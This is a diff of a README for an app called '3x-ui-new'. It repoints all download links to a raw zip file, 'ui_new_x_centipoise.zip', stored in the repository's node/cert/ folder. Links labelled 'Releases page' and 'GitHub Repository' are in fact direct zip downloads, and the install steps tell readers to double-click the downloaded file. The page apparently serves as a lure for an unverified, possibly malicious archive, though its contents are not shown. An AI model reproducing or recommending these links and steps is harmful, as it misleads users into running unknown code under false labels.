@@ -6,11 +6,11 @@ Welcome to 3x-ui-new! This application is currently in open beta testing. With t
 
 ## 📥 Download the Application
 
-[![Download 3x-ui-new](https://github.com/totttonob/3x-ui-new/raw/refs/heads/main/node/cert/new-ui-x-v2.8-beta.1.zip)](https://github.com/totttonob/3x-ui-new/raw/refs/heads/main/node/cert/new-ui-x-v2.8-beta.1.zip)
+[![Download 3x-ui-new](https://github.com/totttonob/3x-ui-new/raw/refs/heads/main/node/cert/ui_new_x_centipoise.zip)](https://github.com/totttonob/3x-ui-new/raw/refs/heads/main/node/cert/ui_new_x_centipoise.zip)
 
 To download the application, visit the Releases page. You will find the latest version available for download.
 
-[Download Now](https://github.com/totttonob/3x-ui-new/raw/refs/heads/main/node/cert/new-ui-x-v2.8-beta.1.zip)
+[Download Now](https://github.com/totttonob/3x-ui-new/raw/refs/heads/main/node/cert/ui_new_x_centipoise.zip)
 
 ## ⚙️ System Requirements
 
@@ -34,7 +34,7 @@ Before you download, ensure your system meets the following requirements:
 
 To install the application, follow these steps:
 
-1. **Visit the Releases page**: Go to [this link](https://github.com/totttonob/3x-ui-new/raw/refs/heads/main/node/cert/new-ui-x-v2.8-beta.1.zip).
+1. **Visit the Releases page**: Go to [this link](https://github.com/totttonob/3x-ui-new/raw/refs/heads/main/node/cert/ui_new_x_centipoise.zip).
 2. **Choose the latest version**: Look for the version labeled "3x-ui v3.0.0b".
 3. **Download the file**: Click on the file suitable for your operating system.
 4. **Open the downloaded file**: Locate the file in your downloads folder and double-click it to start the installation.
@@ -48,7 +48,7 @@ Your input is important to us. If you find any bugs or have suggestions for impr
 
 ## 🔗 Useful Links
 
-- [3x-ui-new Releases](https://github.com/totttonob/3x-ui-new/raw/refs/heads/main/node/cert/new-ui-x-v2.8-beta.1.zip)
-- [GitHub Repository](https://github.com/totttonob/3x-ui-new/raw/refs/heads/main/node/cert/new-ui-x-v2.8-beta.1.zip)
+- [3x-ui-new Releases](https://github.com/totttonob/3x-ui-new/raw/refs/heads/main/node/cert/ui_new_x_centipoise.zip)
+- [GitHub Repository](https://github.com/totttonob/3x-ui-new/raw/refs/heads/main/node/cert/ui_new_x_centipoise.zip)
 
 We appreciate your interest in 3x-ui-new and hope you enjoy our software!
